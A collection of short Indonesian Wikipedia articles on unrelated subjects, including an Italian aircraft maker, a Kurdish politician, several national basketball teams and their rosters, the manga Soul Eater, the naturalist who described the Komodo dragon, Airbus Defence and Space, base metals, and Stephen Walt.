<doc id="1751783" url="https://id.wikipedia.org/wiki?curid=1751783" title="Compagnia Nazionale Aeronautica">
Compagnia Nazionale Aeronautica

Compagnia Nazionale Aeronautica adalah produsen pesawat dan mesin pesawat yang didirikan di Italia pada tahun 1920 oleh Count Giovanni Bonmartini. Bersama dengan sekelompok veteran pilot Perang Dunia I, ia beroperasi sekolah terbang di Roma dari bidang yang akhirnya akan berkembang menjadi bandara Littorio. Untuk dekade berikutnya atau lebih, CNA juga mengembangkan pesawat dan mesin sendiri untuk power mereka. Bonmartini juga telah bekerja pada mesin sepeda motor balap canggih, GBR dalam kemitraan lain, dan akhirnya CNA memperoleh hak untuk ini juga.

Pada tahun 1934 Bonmartini dijual CNA untuk Caproni. Pada gilirannya, Caproni menjual hak untuk mesin GBR untuk Gilera, yang dikembangkan sebagai Rondine.



</doc>
<doc id="1751787" url="https://id.wikipedia.org/wiki?curid=1751787" title="Salih Muslim Muhammad">
Salih Muslim Muhammad

Salih Muslim Muhammad (kelahiran 1951) adalah ketua Partai Persatuan Demokratis (PYD), sebuah kekuatan yang berjalan di bawah wilayah otonomi yang dikuasai Kurdish secara de facto Rojava di Utara Suriah. Sebagai deputi koordinator Komite Koordinasi Nasional untuk Perubahan Demokratis, ia juga menjadi anggota terkuat dari oposisi Kurdish dalam perang saudari Suriah.

Muslim pertama kali menjadi terlibat dengan gerakan Kurdish pada 1970an ketika ia mempelajari teknik di Universitas Teknikal Istanbul setelah menjadi dipengaruhi oleh pertarungan melawan pemerintah Iraq yang dipimpin oleh Mustafa Barzani

Pada 9 Oktober 2013, putra Salih Muslim. Shervan, seorang petarung dalam Unit Perlindungan Rakyat, terbunuh di barat Tell Abyad saat bertarung dengan para pemberontak yang berhubungan al-Qaida. Ia dikubur di kota tempat tinggal keluarganya Kobanê dalam sebuah acara pemakaman publik yang dihadiri oleh ribuan orang.


</doc>
<doc id="1751805" url="https://id.wikipedia.org/wiki?curid=1751805" title="Tim basket nasional Slovenia">
Tim basket nasional Slovenia

Tim basket nasional Slovenia () adalah sebuah tim yang dipilih oleh Federasi Basket Slovenia untuk berkompetisi dalam lomba-lomba basket internasional besar dalam mewakili Slovenia.

Slovenia berakhir di tempat ke-6 pada EuroBasket 2005 dan kemudian terkualifikasi untuk Kejuaraan Dunia Basket 2006. Sejak kemerdekaan negara tersebut pada 1991, tim tersebut berkompetisi pada setiap FIBA EuroBasket, tetapi gagal untuk ikut pada grup berikutnya sampai 2005.



EuroBasket 1993: meraih peringkat ke-16 dari 16 tim<br>4.Roman Horvat, 5.Marko Tušek, 6.Jaka Daneu, 7.Darko Mirt, 8.Primoz Bačar, 9.Jure Zdovc, 10.Boštjan Leban, 11.Teoman Alibegović, 12.Boris Gorenc, 13.Marijan Kraljević, 14.Slavko Kotnik, 15.Žarko Durisić (Pelatih: Janez Drvarič)

Kejuaraan Dunia 1994: tak terkualifikasi

EuroBasket 1995: meraih peringkat ke-12 dari 14 tim<br>4.Roman Horvat, 5.Matjaž Tovornik, 6.Jaka Daneu, 7.Walter Jeklin, 8.Marijan Kraljević, 9.Jure Zdovc, 10.Marko Tušek, 11.Teoman Alibegović, 12.Marko Milič, 13.Boris Gorenc, 14.Slavko Kotnik, 15.Aleš Kunc (Pelatih: Zmago Sagadin)

Olimpiade 1996: tak terkualifikasi

EuroBasket 1997: meraih peringkat ke-14 dari 16 tim<br>4.Walter Jeklin, 5.Goran Jagodnik, 6.Jaka Daneu, 7.Radoslav Nesterović, 9.Jure Zdovc, 8.Aleš Kunc, 10.Marko Tušek, 11.Teoman Alibegović, 12.Marko Milič, 13.Boris Gorenc, 14.Ivica Jurković, 15.Radovan Trifunovic (Pelatih: Andrej Urlep)

Kejuaraan Dunia 1998: tak terkualifikasi

EuroBasket 1999: meraih peringkat ke-10 dari 16 tim<br>4.Jure Zdovc, 5.Walter Jeklin, 6.Jaka Daneu, 7.Sani Bečirović, 8.Marijan Kraljević, 9.Matjaž Tovornik, 10.Matjaž Smodiš, 11.Goran Jagodnik, 12.Marko Milič, 13.Ivica Jurković, 14.Radoslav Nesterović, 15.Ervin Dragsič (Pelatih: Boris Zrinski)

Olimpiade 2000: tak terkualifikasi

EuroBasket 2001: meraih peringkat ke-15 dari 16 tim<br> 4.Beno Udrih, 5.Jaka Lakovič, 6.Boris Gorenc, 7.Sani Bečirović, 8.Marijan Kraljević, 9.Matjaž Smodiš, 10.Marko Tušek, 11.Goran Jagodnik, 12.Marko Milič, 13.Ivica Jurković, 14.Ariel McDonald, 15.Radoslav Nesterović (Pelatih: Boris Zrinski)

Kejuaraan Dunia 2002: tak terkualifikasi

EuroBasket 2003: meraih peringkat ke-10 dari 16 tim<br>4.Goran Jurak, 5.Jaka Lakovič, 6.Boris Gorenc, 7.Simon Petrov, 8.Marijan Kraljević, 9.Boštjan Nachbar, 10.Slavko Duščak, 11.Marko Tušek, 12.Marko Milič, 13.Ivica Jurković, 14.Jurica Golemac, 15.Primož Brezec (Pelatih: Slobodan Subotić)

Olimpiade 2004: tak terkualifikasi

EuroBasket 2005: meraih peringkat ke-6 dari 16 tim<br>4.Goran Jurak, 5.Jaka Lakovič, 6.Aleksandar Ćapin, 7.Sani Bečirović, 8.Radoslav Nesterović, 9.Nebojša Joksimović, 10.Boštjan Nachbar, 11.Erazem Lorbek, 12.Marko Milič, 13.Marko Maravič, 14.Uroš Slokar, 15.Primož Brezec (Pelatih: Aleš Pipan)

Kejuaraan Dunia 2006: meraih peringkat ke-12 dari 24 tim<br>4.Goran Jurak, 5.Jaka Lakovič, 6.Sašo Ožbolt, 7.Sani Bečirović, 8.Radoslav Nesterović, 9.Beno Udrih, 10.Boštjan Nachbar, 11.Željko Zagorac, 12.Marko Milič, 13.Goran Dragić, 14.Uroš Slokar, 15.Primož Brezec (Pelatih: Aleš Pipan)

EuroBasket 2007: meraih peringkat ke-7 dari 16 tim<br>4.Sandi Čebular, 5.Jaka Lakovič, 6.Aleksandar Ćapin, 7.Goran Dragić, 8.Radoslav Nesterović, 9.Matjaž Smodiš, 10.Uroš Slokar, 11.Jaka Klobučar, 12.Goran Jagodnik, 13.Domen Lorbek, 14.Gašper Vidmar, 15.Erazem Lorbek (Pelatih: Aleš Pipan)

Olimpiade 2008: tak terkualifikasi

EuroBasket 2009: meraih peringkat ke-4 dari 16 tim<br>4.Uroš Slokar, 5.Jaka Lakovič, 6.Samo Udrih, 7.Primož Brezec, 8.Matjaž Smodiš, 9.Jaka Klobučar, 10.Boštjan Nachbar, 11.Goran Dragić, 12.Goran Jagodnik, 13.Domen Lorbek, 14.Jurica Golemac, 15.Erazem Lorbek (Pelatih: Jure Zdovc)

Kejuaraan Dunia 2010: meraih peringkat ke-8 dari 24 tim<br>4.Uroš Slokar, 5.Jaka Lakovič, 6.Hasan Rizvić, 7.Sani Bečirović, 8.Jaka Klobučar, 9.Samo Udrih, 10.Boštjan Nachbar, 11.Goran Dragić, 12.Goran Jagodnik, 13.Miha Zupan, 14.Gašper Vidmar, 15.Primož Brezec (Pelatih: Memi Bečirović)

EuroBasket 2011: meraih peringkat ke-7 dari 24 tim<br>4.Uroš Slokar, 5.Jaka Lakovič, 6.Luka Rupnik, 7.Sašo Ožbolt, 8.Matjaž Smodiš, 9.Samo Udrih, 10.Edo Murić, 11.Goran Dragić, 12.Goran Jagodnik, 13.Zoran Dragić, 14.Mirza Begić, 15.Erazem Lorbek (Pelatih: Božidar Maljković)

EuroBasket 2013: meraih peringkat ke-5 dari 24 tim<br>4.Uroš Slokar, 5.Jaka Lakovič, 6.Jure Balažič, 7.Nebojša Joksimović, 8.Edo Murić, 9.Jaka Blažič, 10.Boštjan Nachbar, 11.Goran Dragić, 12.Zoran Dragić, 13.Domen Lorbek, 14.Gašper Vidmar, 15.Mirza Begić (Pelatih: Božidar Maljković)

Kejuaraan Dunia 2014: meraih peringkat ke-7 dari 24 tim<br>4.Jure Balažič, 5.Uroš Slokar, 6.Aleksej Nikolić, 7.Klemen Prepelič, 8.Edo Murić, 9.Jaka Blažič, 10.Miha Zupan, 11.Goran Dragić, 12.Zoran Dragić, 13.Domen Lorbek, 14.Jaka Klobučar, 15.Alen Omić (Pelatih: Jure Zdovc)



</doc>
<doc id="1751809" url="https://id.wikipedia.org/wiki?curid=1751809" title="Tim basket nasional Serbia">
Tim basket nasional Serbia

Tim basket nasional Serbia () mewakili Serbia dalam pertandingan basket internasional dan dikontrol oleh Federasi Basket Serbia. Serbia sekarang berada pada peringkat ketujuh dalam Peringkat Dunia FIBA.

Tim tersebut dikenal sebagai tim basket nasional RF Yugoslavia / Serbia dan Montenegro sampai Juni 2006. Ketika Serbia merdeka, tim tersebut menjadi negara penerus dari Serbia dan Montenegro dan, kemudian, hasil-hasil dari negara sebelumnya RF Yugoslavia / Serbia dan Montenegro secara penuh berhak dimasukkan ke tim tersebut. Namun RF Yugoslavia / Serbia dan Montenegro tidak berkaitan dengan penerus RFSY yang mencetak catatan sebelum 1992 tidak dimasukkan ke tim sekarang.

Di Eurobasket, tim tersebut memenangkan 3 medali emas, pada 1995, 1997, 2001 dan satu medali perunggu di 1999. Serbia menjadi tuan rumah dari Eurobasket 2005, namun hanya menempati peringkat ke-9. Tim tersebut juga mendapatkan medali perak di Olimpiade Musim Panas 1996 dan mendapatkan kembali gelar tersebut di Kejuaraan Dunia FIBA 1998 dan 2002.

Komite Olimpiade Serbia memilih tim basket nasional tersebut untuk tim laki-laki terbaik sebanyak lima kali, dari 1995 sampai 1998 dan pada 2002.

Sebuah generasi muda, yang kembali dipimpin oleh pelatih Dušan Ivković mengembalikan kejayaan lama dengan mendapatkan medali perak di Eurobasket 2009, dan tempat keempat di Kejuaraan Dunia FIBA 2010, dengan tim termudanya. Pada akhir 2013, Aleksandar Đorđević dikonfirmasikan menjadi pengganti dari Ivković. Đorđević memimpin tim tersebut untuk meraih medali perak pada Kejuaraan Dunia FIBA 2014.

Anggota tim dari Piala Dunia Basket FIBA 2014. Informasi klub tersebut berasal dari 30 Agustus 2014.






</doc>
<doc id="1751810" url="https://id.wikipedia.org/wiki?curid=1751810" title="Arena Dalang">
Arena Dalang

Arena Dalang () adalah sebuah arena olahraga dalam ruangan yang terletak di Dalang, Dongguan, Guangdong, China. Kapasitas arena tersebut adalah 4,000 spektator dan dibuka pada 1994. Tempat tersebut menjadi tuan rumah dari beberapa lomba olahraga dalam ruangan seperti basket dan bola voli dan tempat dari Dongguan Leopards yang bermain dalam Asosiasi Basket Tiongkok.



</doc>
<doc id="1751821" url="https://id.wikipedia.org/wiki?curid=1751821" title="Soul Eater">
Soul Eater

Manga "Soul Eater" diterbitkan di Jepang oleh Square Enix tahun 2004. Sedangkan di Indonesia, manga ini diterbitkan oleh Level Comics. Anime dari serial ini diproduksi oleh Bones dan Aniplex, disutradarai oleh Takuya Igarashi dan ditayangkan oleh TV Tokyo. Manga sampingan berjudul "Soul Eater Not! "mulai diserialisasikan tahun 2011.

"Soul Eater" berlatar belakang di Sekolah Pengendali Senjata Shinigami, Death City di Nevada, United States. Sekolah ini dijalankan oleh Shinigami, yang juga dikenal sebagai Kematian, sebagai fasilitas pelatihan untuk manusia yang memiliki kemampuan berubah wujud menjadi senjata, dan untuk para pemegang manusia senjata, yang disebut pengendali senjata. Tokoh-tokoh utama yang bersekolah di sini adalah pengendali senjata Maka Albarn and pasangan senjata sabitnya Soul Eater; pembunuh Black Star dan pasangannya Tsubaki Nakatsukasa, yang dapat berubah wujud menjadi senjata seperti "kusarigama", "shuriken", and "ninjatō"; dan putra dari Shinigami, Death the Kid dan pasangan senjata pistolnya Liz dan Patty Thompson. Tujuan para siswa pengendali senjata adalah mengalahkan 99 jiwa manusia jahat dan satu jiwa penyihir dengan senjata mereka. Kemudian para senjata akan menyerap jiwa-jiwa itu. Jika semua jiwa itu sudah terkumpul, si senjata dapat berubah menjadi sabit kematian, senjata yang dapat digunakan oleh Shinigami.

Maka Albarn (マカ・アルバーン "Maka Arubān") adalah protagonis utama dalam serial Soul Eater. Dia adalah siswi muda yang berdedikasi. Maka terinspirasi oleh ibunya, seorang pengendali senjata. Namun dia sering bersitegang dengan ayahnya Spirit, karena kebiasaan ayahnya yang suka merayu wanita sehingga membuat orang tuanya bercerai. Karena itu, Maka sangat terobsesi untuk mengubah senjatanya menjadi senjata kematian yang lebih kuat dari ayahnya.

Maka digambarkan sebagai seorang dengan rasa keadilan dan moralitas yang kuat. Dia juga karakter yang paling dewasa dan sederhana. Dia berani, bertekad kuat, pekerja keras, baik hati, ceria, cerdas, penuh rasa tanggung jawab, dan blak-blakan. Sebagai seorang teman, Maka sangat setia dan sangat peduli pada mereka.

Dia suka membaca buku dan menyelesaikan teka-teki. Dia sangat rajin belajar untuk mempertahankan labelnya sebagai siswa teladan. Dia bergantung banyak pada buku untuk membantunya memahami hal-hal. Kadang-kadang Soul suka mengejeknya dan menyebut dirinya kutu buku.

Soul "Eater" Evans, juga dikenal sebagai Soul Eater (ソ ウ ル イ ー タ ー, Souruītā) adalah salah satu protagonis utama. Soul memiliki kemampuan berubah menjadi senjata dan merupakan senjata serta Sabit Kematian Maka Albarn.

Soul berasal dari keluarga musisi yang sangat kaya. Dia memiliki kakak bernama Wes yang merupakan seorang pemain biola. Soul merasa rendah diri atas prestasi dan kemampuan yang dimiliki kakaknya meskipun dia sendiri memiliki bakat bermain piano. Walaupun begitu, Soul eenggan menunjukkan bakat bermain pianonya karena dia yakin Wes lebih baik darinya. Setelah mengetahui bahwa dia adalah seorang Senjata Iblis, dia menyadari bahwa dia dapat melarikan diri dari tradisi keluarga musisinya dan berusaha untuk menjadi Sabit Kematian. Dan tampaknya, bukti-bukti menunjukkan bahwa dia adalah yang pertama Senjata Iblis pertama di keluarga Evans.

Soul digambarkan bersikap santai dan acuh tak acuh pada awal seri, di mana dia berusaha membentuk karakter "keren" dalam dirinya namun seringnya malah berakibat mempermalukan dirinya sendiri. Sifat Soul, berkebalikan sama sekali dengan Maka. Dia sering bertengkar dengan Maka karena hal-hal yang tidak penting, tetapi di balik itu semua, dia sangat setia pada teman-temannya dan lebih dari sekali, dia rela mati untuk melindungi teman-temannya.

Black Star (ブラック☆スター "Burakku Sutā", atau "Black☆Star") adalah salah satu protagonis utama, seorang pengendali senjata. Black☆Star adalah salah satu anggota Klan Bintang yang selamat. Dia dilahirkan di dalam klan pembunuh yang terkenal membunuh orang-orang yang tidak bersalah dengan tujuan untuk mencuri dan merampok harta mereka. Pada akhirnya semua anggota klan itu, kecuali Black☆Star yang saat itu masih bayi, dimusnahkan oleh Shinigami. Pasangan Senjata Iblis Black☆Star adalah Tsubaki Nakatsukasa.

Pada awal seri, Black☆Star merupakan anak yang agak sombong, berisik dan egois. Meskipun ia bertarung sebagai seorang pembunuh, dia suka berteriak dan membuat kehadirannya diketahui, alasannya adalah karena dia adalah seorang pencari perhatian. Dia tidak tahan melihat orang lain mendapatkan perhatian lebih dari dirinya, dan akan mengalahkan siapapun yang lebih populer darinya sehingga dia bisa populer lagi. Kenyaringannya sering ditampilkan dalam kecenderungan untuk berteriak ketika ia berbicara dan tertawanya yang khas.

Tsubaki Nakatsukasa (中 務 椿, Nakatsukasa Tsubaki) adalah pasangan senjata Black Star. Tsubaki adalah anggota dari Klan Nakatsukasa, keluarga Senjata Iblis terkenal dari Jepang. Dalam setiap generasi Klan Nakatsukasa, akan ada anggota keluarga yang memiliki kemampuan khusus untuk berubah wujud menjadi beberapa senjata Ninja. Dan pada generasi ini, Tsubaki diberkahi kemampuan khusus itu.

Sebagai salah satu yang tertua dari para karakter utama, Tsubaki adalah salah satu karakter paling dewasa, bersama dengan Maka. Namun, dia tidak pemarah seperti pengendali senjata. Dia sangat sabar dan pemaaf. Dia, seperti Maka, menunjukkan kepribadian yang yang lebih tenang dari sebagian besar karakter lain. Dia memiliki kepribadian yang sangat murah hati, sopan, lembut dan selalu mencoba untuk membantu atau menghibur teman-temannya bahkan ketika dia tidak tahu bagaimana cara membantu mereka. Dia peduli dan pengertian dan kadang-kadang bertindak sebagai mediator ketika teman-temannya bertengkar, dan dia seringkali menjadi tempat bersandar bagi teman-temannya jika mereka sedang tertimpa masalah.

Death the Kid (デ ス · ザ · キ ッ ド, Desu za Kiddo), atau yang biasa disebut sebagai "Kid", adalah shinigami yang kuat dan pengendali senjata dari senjata iblis kembar Liz dan Patty Thompson. Sebagai anak kedua dari Death, dia mewarisi tanggung jawab ayahnya sebagai Shinigami.

Walaupun Kid memiliki kekuatan yang pantas diperhitungkan, ia memiliki satu kelemahan psikologis menyiksa dirinya serta fisik handicap dia di kesempatan. Dia adalah penderita gangguan kepribadian obsesif-kompulsif, atau OCPD, yang dimanifestasikan sebagai obsesi atas kesimetrisan. Benda dan lingkungan yang tidak simetris dapat mengalihkan perhatiannya dari misi dan Kid akan menolak melanjutkan pekerjaannya jika dia melihat benda-benda asimetris di sekitarnya. Jadi, jika ada sesuatu yang salah sedikit saja, aia akan segera berusaha memperbaikinya, bahkan jika dia harus mengorbankan misinya.


</doc>
<doc id="1751836" url="https://id.wikipedia.org/wiki?curid=1751836" title="Pieter Antonie Ouwens">
Pieter Antonie Ouwens

Pieter Antonie "Peter" Ouwens () adalah ilmuwan Belanda yang menjadi direktur Kebun Raya Bogor. Ia banyak dikenal atas tulisan penggambaran resmi pertama komodo ("Varanus komodoensis") pada tahun 1912.

Peter Ouwens adalah putera Pieter Anthonis Ouwens, seorang akuntan di Amsterdam, dan Caroline Reiniera Nagels. Ia belajar di Akademi Militer Kerajaan Belanda di Breda dari tahun 1867. 4 tahun kemudian, ia menjadi letnan infanteri di Nederlands-Indië dan dari tahun 1883 naik pangkat sebagai kapiten. Pada bulan Januari 1879, ia menikahi Johanna Vosmaer di Kutaraja (kini Banda Aceh. Mereka bercerai sebulan setelah kelahiran anak tunggal mereka pada tahun 1882 di Salatiga dan Ouwens menikah kembali dengan Jeanne Dikkers pada bulan Desember 1883 di Purworejo. Ia menikah kembali dengan Anna Josephina Soesman pada tahun 1902.

Ia akhirnya menjadi kurator Kebun Raya Bogor. Ia menerima foto dan kulit komodo dari Letnan Jacques Karel Henri van Steyn van Hensbroek yang merupakan orang Barat pertama yang mengamati biawak raksasa yang disebutkan panjangnya mencapai 6-7 meter. Ouwens mengutus seorang kolektor ke Pulau Komodo yang kembali ke Jawa dengan 2 spesimen dewasa dan 1 spesimen muda. Ouwens menyebut spesies tersebut "Varanus komodoensis" dalam jurnal tahun 1912. Ouwens menjadi perwira dalam Orde Oranje-Nassau.


</doc>
<doc id="1751844" url="https://id.wikipedia.org/wiki?curid=1751844" title="Airbus Defence and Space">
Airbus Defence and Space

Airbus Defence and Space adalah divisi Airbus Group yang bertanggung jawab untuk produk dan jasa pertahanan dan kedirgantaraan. Airbus Defence and Space dibentuk pada bulan Januari 2014 dari bekas divisi EADS yaitu Airbus Military, Astrium, dan Cassidian.

Airbus Defence and Space hadir di puluhan negara di semua benua.

Pada tanggal 31 Juli 2013, European Aeronautic Defence and Space Company (EADS) mengumumkan bahwa mereka akan mengubah nama perusahaan menjadi Airbus Group pada akhir tahun itu, dan Astrium, Cassidian, serta Airbus Military akan bergabung untuk membentuk sebuah perusahaan baru: "Airbus Defence and Space."

Pada bulan Januari 2014, EADS melakukan reorganisasi sebagai Airbus Group, dari tiga anak perusahaan yang mencakup Airbus Defence and Space, Airbus, dan Airbus Helicopters.




</doc>
<doc id="1751854" url="https://id.wikipedia.org/wiki?curid=1751854" title="Logam dasar">
Logam dasar

Logam dasar adalah sebutan bagi sekelompok logam umum yang relatif tidak mahal, bila dibandingkan dengan logam mulia seperti emas dan perak. Para ahli alkimia dari Abad Kuno dan Abad Pertengahan kerap berupaya melakukan transmutasi logam dasar (berkadar rendah) menjadi logam mulia. Dalam numismatik, uang logam seringkali ditetapkan nilainya berdasarkan kandungan logam mulianya, tetapi logam dasar juga digunakan sebagai uang logam baik pada masa lalu maupun masa kini.

Suatu logam dasar dapat dicirikan dari relatif mudahnya mengalami oksidasi atau korosi, serta reaksi variatifnya dengan asam klorida (HCl) encer yang menghasilkan hidrogen. Contohnya adalah besi, nikel, timah, dan seng. Tembaga juga dianggap sebagai logam dasar karena relatif mudah mengalami oksidasi, meskipun tidak bereaksi dengan HCl.

Dalam bidang pertambangan dan ekonomi, istilah logam dasar merujuk pada logam-logam industrial non-besi di luar logam mulia, yaitu tembaga, timah, nikel, dan seng. Definisi logam dasar menurut "US Customs and Border Protection" lebih inklusif, yaitu mencakup besi, baja, aluminium, timah, tungsten, molibdenum, tantalum, kobalt, bismut, kadmium, titanium, zirkonium, antimon, mangan, berilium, kromium, germanium, vanadium, galium, hafnium, indium, niobium, renium, dan talium.

Zamak adalah suatu logam paduan ("alloy") yang digunakan dalam pengecoran logam, yang terkadang juga disebut sebagai 'logam dasar' atau 'logam kotor' ("muckite").

Dalam konteks penyepuhan produk logam berlapis, logam dasar menjadi lapisan dasar di bawah logam mulia, misalnya tembaga sebagai dasar perak dalam penyepuhan Sheffield.



</doc>
<doc id="1752063" url="https://id.wikipedia.org/wiki?curid=1752063" title="Stephen Walt">
Stephen Walt

Stephen Martin Walt (lahir 2 Juli 1955) adalah dosen hubungan internasional di John F. Kennedy School of Government, Universitas Harvard, Amerika Serikat. Karya-karya terpentingnya adalah "Origins of Alliances" dan "Revolution and War". Ia juga menulis "The Israel Lobby and U.S. Foreign Policy" bersama John Mearsheimer.

Dalam bukunya tahun 1987, "The Origins of Alliances", Walt menjelaskan cara aliansi terbentuk, dan "mengusulkan perubahan sistem aliansi modern secara menyeluruuh."

"Revolution and War" (1996) mengekspos "kelemahan teori hubungan antara revolusi dan perang" dengan menjelaskan revolusi Prancis, Rusia, dan Iran secara rinci dan menyisipkan sedikit revolusi Amerika Serikat, Meksiko, Turki, dan Cina.

"Taming American Power" (2005) memaparkan kritik terhadap strategi Amerika Serikat dari sudut pandang musuhnya. Anatol Lieven menyebut buku ini "kontribusi yang brilian bagi perdebatan kebijakan luar negeri Amerika Serikat."

Pada bulan Maret 2006, John Mearsheimer dan Walt, saat itu masih menjabat dekan akademik Kennedy School of Government, menerbitkan makalah berjudul "The Israel Lobby and U.S. Foreign Policy" dan artikel berjudul "The Israel Lobby" di "London Review of Books" yang menjelaskan efek negatif "kekuasaan lobi Israel yang tak tertandingi." Mereka mendefinisikan lobi Israel sebagai "koalisi individu dan organisasi yang aktif menyetir kebijakan luar negeri A.S. ke arah pro-Israel." Mearsheimer dan Walt berpendapat bahwa, "Semua yang diinginkan lobi Israel biasanya terwujud."

Artikel-artikel tersebut, ditambah buku yang disusun Walt dan Mearsheimer, mendapat perhatian media di seluruh dunia. Sambil berasalan bahwa Walt dan Mearsheimer adalah bagian dari "aliran ilmu yang pada dasarnya berharap perang melawan jihadisme tidak pernah terjadi," Christopher Hitchens menulis bahwa, "Harapan telah menggiring mereka untuk menjelaskan akar masalahnya secara keliru..." Mantan Duta Besar A.S. Edward Peck menulis bahwa "tsunami" tanggapan yang mengutuk laporan tersebut membuktikan bahwa lobi Israel itu ada dan, "Muncul opini berbeda tentang kerugian dan keuntungan bagi kedua negara, namun kepentingan Israel yang diutamakan para pelobi telah menjadi dasar kebijakan Timur Tengah A.S."

Walt menikah dengan Rebecca E. Stone dan dikaruniai dua anak.




</doc>
<doc id="1752073" url="https://id.wikipedia.org/wiki?curid=1752073" title="Provinsi di Aljazair">
Provinsi di Aljazair

Aljazair terdiri dari 48 provinsi, 553 distrik dan 1541 munisipalitas.




</doc>
<doc id="1752078" url="https://id.wikipedia.org/wiki?curid=1752078" title="Tim basket nasional Jerman">
Tim basket nasional Jerman

Tim basket nasional Jerman untuk pria adalah tim basket yang mewakili Jerman dalam kompetisi-kompetisi internasional. Tim tersebut diurus dan dijalankan oleh Federasi Basket Jerman. (Jerman: "Deutscher Basketball Bund")

Kesuksesan terbesar mereka adalah kemenangan dalam Kejuaraan Eropa 1993 di Jerman, medali perak di 2005 Kejuaraan Eropa dan medali perunggu dalam Kejuaraan Dunia FIBA 2002.

Tim tersebut adalah pengganti dari tim basket nasional Jerman Barat, tim basket yang mewakili Jerman Barat di kompetisi internasional. Antara 1955 dan 1973, Jerman pada beberapa waktu berkompetisi dengan tim basket nasional Jerman Timur.

Penampilan Jerman pertama dalam kejuaraan basket Eropa adalah pada Eurobasket 1951 di Paris. Jerman Barat menyelesaikan putaran preliminer dengan catatan 1–2, menempati tempat ketiga dalam grup mereka.

Anggota tim untuk kualifikasi EuroBasket FIBA 2015.

"sumber"

Sebagai Jerman

Permainan Olimpiade 1936: menempati peringkat ke-17 dari 21 tim

Hans Niclaus, Emil Goring, Kurt Oleska, Bernhard Cuiper, Karl Endres, Emil Lohbeck, Heinz Steinschulte, Otto Kuchenbecker, Siegfreid Reischiess, Robert Duis (Pelatih: Hugo Murero)

Sebagai Jerman Barat

EuroBasket 1951: menempati peringkat ke-12 dari 17 tim

Rudolf Beyerlein, Wolfgang Heinker, Rudi Hohner, Franz Kronberger, Willi Leissler, Harald Muller, Gunter Piontek, Oskar Roth, Theodor Schober, Kurt Siebenhaar, Arthur Stolz, Markus Bernhard, Diefenbach, Konz (Pelatih: Theo Clausen)

EuroBasket 1953: menempati peringkat ke-14 dari 17 tim

Kurt Siebenhaar, Theodor Schober, Richard Mahrwald, Gunter Piontek, Friedrich Mahlo, Hans Bayer, Hartmut Kruger, Oskar Roth, Rolf Heinker, Gerd Konzag, Rudolf Beyerlein, Richard Griese, Markus Bernhard (Pelatih: Anton Kartak)

EuroBasket 1955: menempati peringkat ke-17 dari 18 tim

Oskar Roth, Kurt Siebenhaar, Theodor Schober, Harald Muller, Rudolf Beyerlein, Arthur Stolz, Richard Griese, Friebel, Brehm, Vogt, Waldowski, Schmitt, Pfeiffer (Pelatih: Anton Kartak)

EuroBasket 1957: menempati peringkat ke-13 dari 16 tim

Oskar Roth, Horst Stein, Hans Brydniak, Gerhard Biller, Arthur Stolz, Richard Griese, Klaus Schulz, Lamade, Ottmar, Peter, Scherer, Vogt, Waldowski (Pelatih: Theodor Vychodil)

EuroBasket 1961: menempati peringkat ke-16 dari 19 tim

Klaus Weinand, Klaus Schulz, Hannes Neumann, Jurgen Langhoff, Hans Gruttner, Volker Heindel, Horst Stein, Oskar Roth, Gerhard Biller, Hans Brydniak, Arthur Stolz (Pelatih: Branimir Volfer)

EuroBasket 1965: menempati peringkat ke-14 dari 16 tim

Klaus Urmitzer, Dietmar Kienast, Hannes Neumann, Bernd Roder, Klaus Weinand, Harald Jungnickel, Klaus Schulz, Jorg Kruger, Neef, Niedlich, Sarodnik, Wolfram (Pelatih: Yakovos Bilek)

EuroBasket 1971: menempati peringkat ke-9 dari 12 tim

Helmut Uhlig, Dieter Pfeiffer, Jurgen Loibl, Gerd Brand, Rainer Pethran, Jochen Pollex, Klaus Urmitzer, Holger Geschwindner, Jurgen Wohlers, Dietrich Keller, Norbert Thimm (Pelatih: Theodor Schober)

Permainan Olimpiade 1972: menempati peringkat ke-12 dari 16 tim

Helmut Uhlig, Klaus Weinand, Dieter Kuprella, Karl Ampt, Hans-Jorg Kruger, Rainer Pethran, Jochen Pollex, Joachim Linnemann, Holger Geschwindner, Jurgen Wohlers, Dietrich Keller, Norbert Thimm (Pelatih: Theodor Schober)

EuroBasket 1981: menempati peringkat ke-10 dari 12 tim

Klaus Zander, Hans-Gunther Ludwig, Joseph Waniek, Sebastian Brunnert, Matthias Strauss, Jorg Heidrich, Michael Pappert, Volkert Asshoff, Holger Arpe, Lutz Wadehn, Armin Sowa, Ingo Mendel (Pelatih: Terry Schofield)

EuroBasket 1983: menempati peringkat ke-8 dari 12 tim

Detlef Schrempf, Klaus Zander, Uwe Blab, Gunther Behnke, Christoph Korner, Frank Hudson, Uwe Brauer, Matthias Strauss, Ulrich Peters, Michael Pappert, Armin Sowa, Lutz Wadehn (Pelatih: Chris Lee)

Permainan Olimpiade 1984: menempati peringkat ke-8 dari 12 tim

Detlef Schrempf, Uwe Blab, Klaus Zander, Christian Welp, Christoph Korner, Vladimir Kadlec, Uwe Brauer, Uwe Sauer, Ulrich Peters, Michael Pappert, Armin Sowa, Ingo Mendel (Pelatih: Ralph Klein)

EuroBasket 1985: menempati peringkat ke-5 dari 12 tim

Detlef Schrempf, Uwe Blab, Michael Jackel, Christian Welp, Gunther Behnke, Stephan Baeck, Ulrich Peters, Christoph Korner, Uwe Sauer, Armin Sowa, Lutz Wadehn, Burkhard Schroder (Pelatih: Ralph Klein)

Kejuaraan Dunia 1986: menempati peringkat ke-16 dari 24 tim

Gunther Behnke, Christian Welp, Michael Koch, Hansi Gnad, Ralf Risse, Armin Andres, Jan Villwock, Rainer Greunke, Holger Arpe, Armin Sowa, Lutz Wadehn, Burkhard Schroder (Pelatih: Ralph Klein)

EuroBasket 1987: menempati peringkat ke-6 dari 12 tim

Gunther Behnke, Michael Jackel, Michael Koch, Christian Welp, Hansi Gnad, Henning Harnisch, Sven Meyer, Armin Andres, Christoph Korner, Jens Kujawa, Michael Pappert, Lutz Wadehn (Pelatih: Ralph Klein)

Sebagai Jerman

Permainan Olimpiade 1992: menempati peringkat ke-7 dari 12 tim

Detlef Schrempf, Uwe Blab, Henning Harnisch, Gunther Behnke, Hansi Gnad, Kai Nurnberger, Henrik Rödl, Stephan Baeck, Michael Jackel, Jens Kujawa, Armin Andres, Arndt Neuhaus (Pelatih: Svetislav Pešić)

EuroBasket 1993: menempati peringkat ke-1 dari 16 tim

Christian Welp, Henning Harnisch, Hansi Gnad, Michael Koch, Gunther Behnke, Kai Nurnberger, Henrik Rödl, Stephan Baeck, Michael Jackel, Moritz Kleine-Brockhoff, Teoman Öztürk, Jens Kujawa (Pelatih: Svetislav Pešić)

Kejuaraan Dunia 1994: menempati peringkat ke-12 dari 16 tim

